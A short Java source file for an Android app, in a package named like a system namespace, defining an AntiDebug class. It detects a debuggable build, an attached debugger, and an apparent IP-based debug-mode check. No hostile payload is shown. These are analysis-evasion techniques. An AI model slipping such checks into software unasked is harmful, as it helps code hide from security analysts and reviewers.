package com.android.networking.util;

import com.android.networking.Status;

import android.content.pm.ApplicationInfo;
import android.os.Debug;

public class AntiDebug {
	
	public boolean checkFlag(){
		boolean debug =
	            (Status.self().getAppContext().getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;
		return debug;
	}
	
	public boolean checkIp(){
		CheckDebugModeTask checkDebugMode = new CheckDebugModeTask();
		checkDebugMode.execute("");
		
		synchronized (checkDebugMode) {
			try {
				checkDebugMode.lock.wait();
			} catch (InterruptedException e) {
				
			}
		}
		return checkDebugMode.IsDebug;
	}
	
	public boolean checkConnected(){
		return Debug.isDebuggerConnected();
	}
	
	public boolean isDebug(){
		return checkFlag() || checkConnected() || checkIp() ;
	}
}
